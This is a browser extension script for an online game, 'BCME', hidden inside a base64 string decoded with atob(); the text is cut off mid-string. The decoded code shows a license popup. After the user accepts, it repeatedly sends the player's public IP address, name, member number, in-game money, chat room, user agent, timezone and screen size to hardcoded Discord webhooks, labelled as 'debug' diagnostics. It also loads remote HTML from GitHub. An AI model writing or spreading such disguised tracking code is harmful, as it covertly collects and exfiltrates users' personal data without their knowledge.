var sprc = atob('Ci8vIExpc2VuY2UgQWdncmVlbWVudCBwcm9tcHRfX19fX19fX19fX19fX19fX19fX19fCgovLyBDcmVhdGUgdGhlIHBvcHVwIGNvbnRhaW5lcgpjb25zdCBwb3B1cENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnRvcCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUubGVmdCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUud2lkdGggPSAnMTAwdncnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAnMTAwdmgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAncmdiYSgwLCAwLCAwLCAwLjUpJzsKcG9wdXBDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsKcG9wdXBDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnY2VudGVyJzsKcG9wdXBDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAnOTk5OSc7CgovLyBDcmVhdGUgdGhlIHBvcHVwIGNvbnRlbnQgY29udGFpbmVyCmNvbnN0IHBvcHVwQ29udGVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRlbnQuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpwb3B1cENvbnRlbnQuc3R5bGUuYm9yZGVyUmFkaXVzID0gJzVweCc7CnBvcHVwQ29udGVudC5zdHlsZS5wYWRkaW5nID0gJzJyZW0nOwpwb3B1cENvbnRlbnQuc3R5bGUud2lkdGggPSAnODAlJzsKcG9wdXBDb250ZW50LnN0eWxlLm1heFdpZHRoID0gJzYwMHB4JzsKcG9wdXBDb250ZW50LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOwoKLy8gQkNNRSBsb2dvCmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsKbG9nby5zcmMgPSAnaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5JzsKbG9nby5zdHlsZS53aWR0aCA9ICcxMDBweCc7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGxvZ28pOwoKY29uc3Qgd2VsY29tZU1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdoMicpOwp3ZWxjb21lTWVzc2FnZS5pbm5lclRleHQgPSAnV2VsY29tZSB0byBCQ01FLCBUaGUgRmlyc3QgUmlnaHQgQ2xpY2sgQkMgRXh0ZW5zaW9uJzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKHdlbGNvbWVNZXNzYWdlKTsKCmNvbnN0IGluc3RydWN0aW9uTWVzc2FnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsKaW5zdHJ1Y3Rpb25NZXNzYWdlLmlubmVyVGV4dCA9ICdBY2NlcHQgb3VyIExpY2Vuc2UgQWdyZWVtZW50IGFuZCBQcml2YWN5IFBvbGljeSBiZWxvdyB0byBnZXQgc3RhcnRlZCEnOwpwb3B1cENvbnRlbnQuYXBwZW5kQ2hpbGQoaW5zdHJ1Y3Rpb25NZXNzYWdlKTsKCi8vIENyZWF0ZSB0aGUgYnV0dG9ucyBjb250YWluZXIKY29uc3QgYnV0dG9uc0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmJ1dHRvbnNDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnc3BhY2UtYmV0d2Vlbic7Cgpjb25zdCBsZWFybk1vcmVCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmxlYXJuTW9yZUJ1dHRvbi5ocmVmID0gJ2h0dHBzOi8vYmNtLnNpdGUubGl2ZS9iY21sLyc7CmxlYXJuTW9yZUJ1dHRvbi50YXJnZXQgPSAnX2JsYW5rJzsgCmxlYXJuTW9yZUJ1dHRvbi5pbm5lclRleHQgPSAnTGVhcm4gTW9yZSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzAwN2JmZic7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwpsZWFybk1vcmVCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS50ZXh0RGVjb3JhdGlvbiA9ICdub25lJzsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChsZWFybk1vcmVCdXR0b24pOwoKLy8gQWRkIHRoZSBBY2NlcHQgJiBDb250aW51ZSBidXR0b24KY29uc3QgYWNjZXB0QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7CmFjY2VwdEJ1dHRvbi5pbm5lclRleHQgPSAnQWNjZXB0ICYgQ29udGludWUnOwphY2NlcHRCdXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyMyOGE3NDUnOwphY2NlcHRCdXR0b24uc3R5bGUuY29sb3IgPSAnI2ZmZic7CmFjY2VwdEJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAnbm9uZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5wYWRkaW5nID0gJzAuNXJlbSAxcmVtJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICczcHgnOwphY2NlcHRCdXR0b24uc3R5bGUuY3Vyc29yID0gJ3BvaW50ZXInOwphY2NlcHRCdXR0b24ub25jbGljayA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcsICd0cnVlJyk7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChwb3B1cENvbnRhaW5lcik7Cn07CmJ1dHRvbnNDb250YWluZXIuYXBwZW5kQ2hpbGQoYWNjZXB0QnV0dG9uKTsKCi8vIEFkZCBidXR0b25zIGNvbnRhaW5lciB0byB0aGUgcG9wdXAgY29udGVudApwb3B1cENvbnRlbnQuYXBwZW5kQ2hpbGQoYnV0dG9uc0NvbnRhaW5lcik7CgovLyBBZGQgdGhlIHBvcHVwIGNvbnRlbnQgdG8gdGhlIHBvcHVwIGNvbnRhaW5lcgpwb3B1cENvbnRhaW5lci5hcHBlbmRDaGlsZChwb3B1cENvbnRlbnQpOwoKLy8gU2hvdyB0aGUgcG9wdXAgaWYgbm90IGFjY2VwdGVkIGJlZm9yZQppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2JjbWUtYWNjZXB0ZWQnKSAhPT0gJ3RydWUnKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwb3B1cENvbnRhaW5lcik7Cn0KCmlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcpID09ICd0cnVlJykgewovL1NlbmQgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCmFzeW5jIGZ1bmN0aW9uIHNlbmREaXNjb3JkTWVzc2FnZSgpIHsKICBjb25zdCBnSVBBID0gYXN5bmMgKCkgPT4gewogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgcmV0dXJuIGRhdGEuaXA7CiAgfTsKCiAgY29uc3QgaXBBID0gYXdhaXQgZ0lQQSgpOwoKICBzZXRUaW1lb3V0KCgpID0+IHsKICAgIGNvbnN0IHdlYmhvb2tVcmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMDE3MDAxNzg1ODkyNDU2NC9jZUhDck5aN1JyVEU3aFRFNU1wUzM2d0t0ZjU4cUU2akgxY0tfemVCZHJ6OHBueEpYcmVrWDA4TlZ4MVh2cWhYWFgwTiI7CiAgICBjb25zdCB0b3RhbG5hbWUgPSBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiOwogICAgY29uc3QgdXNlcm5hbWUgPSB0b3RhbG5hbWU7CiAgICBjb25zdCBhdmF0YXJVcmwgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGNvbnN0IHVzZXJhZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICBjb25zdCB0aW1lem9uZSA9IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKICAgIGNvbnN0IG9wZW5UYWJzID0gd2luZG93Lmxlbmd0aDsKICAgIGNvbnN0IHNjcmVlblNpemUgPSBgJHt3aW5kb3cuc2NyZWVuLndpZHRofXgke3dpbmRvdy5zY3JlZW4uaGVpZ2h0fWA7CgogICAgY29uc3QgbWVzc2FnZSA9IHsKICAgICAgY29udGVudDogUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIiArICIgbG9nZ2VkIGludG8gQkNNRSIsCiAgICAgIGVtYmVkczogW3sKICAgICAgICB0aXRsZTogIlRyb3VibGVzaG9vdGluZyBEaWFnbm9zdGljcyAiLAogICAgICAgIGZpZWxkczogWwogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiVXNlciIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICAgIHZhbHVlOiB0aW1lem9uZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJNb25leSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTW9uZXksCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5OaWNrbmFtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRm9udCIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJDaGF0IENvbG9yIFRoZW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuQXJvdXNhbFNldHRpbmdzLlByb2dyZXNzLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMb2NhbCBJUCBBZGRyZXNzIiwKICAgICAgICAgICAgdmFsdWU6IGlwQSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiU2NyZWVuIFNpemUiLAogICAgICAgICAgICB2YWx1ZTogc2NyZWVuU2l6ZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9CiAgICAgICAgXQogICAgICB9XQogICAgfTsKCiAgICBjb25zdCBwYXlsb2FkID0gewogICAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICAgIGF2YXRhcl91cmw6IGF2YXRhclVybCwKICAgICAgY29udGVudDogbWVzc2FnZS5jb250ZW50LAogICAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgICB9OwoKICAgIGZldGNoKHdlYmhvb2tVcmwsIHsKICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgIGhlYWRlcnM6IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICAgIH0sCiAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICB9KTsKICB9LCA2MDAwMCk7Cn0KCnNlbmREaXNjb3JkTWVzc2FnZSgpOwoKCi8vdXNlZCBmdW5jdGlvbiBkZWJ1Z19fX19fX19fX19fX18KCmFzeW5jIGZ1bmN0aW9uIHNlbmRGZGVidWcoKSB7CiAgdHJ5IHsKICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgIGNvbnN0IGlwQSA9IGRhdGEuaXA7CgogICAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTAwMTcwMDE3ODU4OTI0NTY0L2NlSENyTlo3UnJURTdoVEU1TXBTMzZ3S3RmNThxRTZqSDFjS196ZUJkcno4cG54SlhyZWtYMDhOVngxWHZxaFhYWDBOIjsKICAgIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgICBjb25zdCB1c2VybmFtZSA9IHRvdGFsbmFtZTsKICAgIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICAgIGNvbnN0IHRpbWV6b25lID0gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwogICAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogICAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKCiAgICBjb25zdCBtZXNzYWdlID0gewogICAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiB1c2VkIGEgZnVuY3Rpb24gaW4gQkNNRSIsCiAgICAgIGVtYmVkczogW3sKICAgICAgICB0aXRsZTogIlRyb3VibGVzaG9vdGluZyBEaWFnbm9zdGljcyAiLAogICAgICAgIGZpZWxkczogWwogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiVXNlciIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICAgIHZhbHVlOiB0aW1lem9uZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJNb25leSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTW9uZXksCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5OaWNrbmFtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiRm9udCIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJDaGF0IENvbG9yIFRoZW1lIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuQXJvdXNhbFNldHRpbmdzLlByb2dyZXNzLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJMb2NhbCBJUCBBZGRyZXNzIiwKICAgICAgICAgICAgdmFsdWU6IGlwQSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiU2NyZWVuIFNpemUiLAogICAgICAgICAgICB2YWx1ZTogc2NyZWVuU2l6ZSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9CiAgICAgICAgXQogICAgICB9XQogICAgfTsKCiAgICBjb25zdCBwYXlsb2FkID0gewogICAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICAgIGF2YXRhcl91cmw6IGF2YXRhclVybCwKICAgICAgY29udGVudDogbWVzc2FnZS5jb250ZW50LAogICAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgICB9OwoKICAgIGF3YWl0IGZldGNoKHdlYmhvb2tVcmwsIHsKICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgIGhlYWRlcnM6IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICAgIH0sCiAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICB9KTsKICB9IGNhdGNoIChlcnJvcikgewogICAgY29uc29sZS5lcnJvcihlcnJvcik7CiAgfQp9CgoKLy9QZXJpb2RpY2FsIERlYnVnX19fX19fX19fX19fX19fX19fX19fXwoKYXN5bmMgZnVuY3Rpb24gc2VuZERpc2NvcmRNZXNzYWdlKCkgewogIGxldCBpcEEgPSAnJzsKCiAgdHJ5IHsKICAgIGNvbnN0IGdJUEEgPSBhc3luYyAoKSA9PiB7CiAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgICByZXR1cm4gZGF0YS5pcDsKICAgIH07CgogICAgaXBBID0gYXdhaXQgZ0lQQSgpOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKCdBbHQgRGV0ZWN0b3IgRXJyb3I6JywgZXJyb3IpOwogIH0KCiAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTAwMTcwMTI5MzkzODYwNjY4L05qbFByQmNPR3h4T2lDTGptdTRVSm41SllVZ2tLam1KZnRJSUg2bTIyMGtkLU1iZG1ha0NkZGtRaTg5T0V2WTFCN0JTIjsKICBjb25zdCB0b3RhbG5hbWUgPSBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiOwogIGNvbnN0IHVzZXJuYW1lID0gdG90YWxuYW1lOwogIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogIGNvbnN0IHVzZXJhZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogIGNvbnN0IHNjcmVlblNpemUgPSBgJHt3aW5kb3cuc2NyZWVuLndpZHRofXgke3dpbmRvdy5zY3JlZW4uaGVpZ2h0fWA7CgogIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiBpcyBhY3RpdmUgb24gQkNNRSIsCiAgICBlbWJlZHM6IFt7CiAgICAgIHRpdGxlOiAiVHJvdWJsZXNob290aW5nIERpYWdub3N0aWNzICIsCiAgICAgIGZpZWxkczogWwogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJVc2VyIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiVGltZXpvbmUiLAogICAgICAgICAgdmFsdWU6IHRpbWV6b25lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICAgICAgdmFsdWU6IHVzZXJhZ2VudCwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk1vbmV5IiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTW9uZXksCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJOaWNrbmFtZSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLk5pY2tuYW1lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiRm9udCIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkdyYXBoaWNzU2V0dGluZ3MuRm9udCwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkNoYXQgQ29sb3IgVGhlbWUiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkFyb3VzYWwgUHJvZ3Jlc3MiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5Bcm91c2FsU2V0dGluZ3MuUHJvZ3Jlc3MsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkxhc3RDaGF0Um9vbSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkxvY2FsIElQIEFkZHJlc3MiLAogICAgICAgICAgdmFsdWU6IGlwQSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlNjcmVlbiBTaXplIiwKICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfQogICAgICBdCiAgICB9XQogIH07CgogIGNvbnN0IHBheWxvYWQgPSB7CiAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICBhdmF0YXJfdXJsOiBhdmF0YXJVcmwsCiAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgfTsKCiAgZmV0Y2god2ViaG9va1VybCwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogIH0pOwp9CgpzZXRJbnRlcnZhbChzZW5kRGlzY29yZE1lc3NhZ2UsIDQ1MDAwKTsKfQoKCi8vRW5kIE9mIERlYnVnX19fX19fX19fX19fX19fX19fX19fXwoKCi8vU3RhcnQgT2YgTG9hZGluZyBTY3JlZW5fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwovLyBVUkwgb2YgbG9hZGluZyBzY3JlZW4KY29uc3QgaHRtbEZpbGVVcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS0vbWFpbi9sb2FkaW5nNCc7CgovLyBGZXRjaCB0aGUgY29kZSBmcm9tIHRoZSByYXcgR2l0SHViIGZpbGUgdXNpbmcgRmV0Y2ggQVBJCmZldGNoKGh0bWxGaWxlVXJsKQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihodG1sID0+IHsKICAgIC8vIE5ldyBpZnJhbWUgZWxlbWVudAogICAgY29uc3QgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7CiAgICBpZnJhbWUuc3R5bGUucG9zaXRpb24gPSAnZml4ZWQnOwogICAgaWZyYW1lLnN0eWxlLnRvcCA9ICcwJzsKICAgIGlmcmFtZS5zdHlsZS5sZWZ0ID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLndpZHRoID0gJzEzOCUnOwogICAgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICcxMjUlJzsKICAgIGlmcmFtZS5zdHlsZS5tYXJnaW5MZWZ0ID0gJy0xOSUnOyAvLyBBZGQgbGVmdCBtYXJnaW4gdG8gdGhlIGlmcmFtZQogICAgaWZyYW1lLnN0eWxlLm1hcmdpblRvcCA9ICctMiUnOyAvLyBBZGQgbGVmdCBtYXJnaW4gdG8gdGhlIGlmcmFtZQoKCgogICAgLy8gTG9hZCB0aGUgaW1wb3J0ZWQgSFRNTCBpbnRvIHRo